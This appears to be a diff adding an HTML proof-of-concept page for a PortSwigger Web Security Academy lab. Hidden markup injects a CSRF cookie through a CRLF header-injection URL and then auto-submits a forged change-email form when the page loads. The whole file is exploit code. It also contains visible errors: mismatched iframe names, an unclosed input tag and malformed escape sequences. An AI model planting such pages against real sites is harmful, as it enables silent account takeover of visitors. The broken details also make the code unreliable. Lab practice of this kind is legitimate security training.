@@ -1,0 +1,20 @@
+<html>
+  <body>
+    <h1>Hello World</h1>
+    <iframe style="display: none" name="crsf-iframe"></iframe>
+    <form
+      action="https://0ae60078030d1a97c0287c440036005a.web-security-academy.net/my-account/change-email"
+      method="post"
+      target="csrf-iframe"
+    >
+      <input type="hidden" name="email" value="test5@test.ca" />
+      <input type="hidden" name="csrf" value="test"
+    </form>
+
+    <img
+      style="display: none"
+      src="https://0ae60078030d1a97c0287c440036005a.web-security-academy.net/my-account/change-email/?search=hat%0d%0qSet=Cookie:%20csrf=test"
+      onerror="document.forms[0].submit()"
+    />
+  </body>
+</html>
